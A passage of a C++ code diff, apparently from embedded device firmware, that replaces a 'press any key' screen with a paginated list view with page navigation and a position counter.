+                int last = std::min((int)rows.size(), off + perPage);
+                String pos = String(off + 1) + "-" + String(last) + "/" + String((int)rows.size());
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+                tft.drawRightString(pos, g.listL + g.listW, g.footY, 1);
             }
-            lineY += lineHeight;
-            if (lineY > tftHeight - 45) break;
         }
-        yPos = lineY;
-    }
 
-    tft.setTextColor(TFT_WHITE, bgColor);
-    tft.setCursor(20, tftHeight - 35);
-    tft.print("Press any key to continue...");
-
-    while (true) {
-        if (check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
-            delay(200);
-            return;
+        if (check(EscPress) || check(SelPress)) return;
+        else if (check(PrevPress) || check(UpPress)) off = std::max(0, off - perPage);
+        else if (check(NextPress) || check(DownPress)) {
+            if (off + perPage < (int)rows.size()) off += perPage;
         }
-        delay(50);
+        vTaskDelay(20 / portTICK_PERIOD_MS);
     }
 }
 #endif
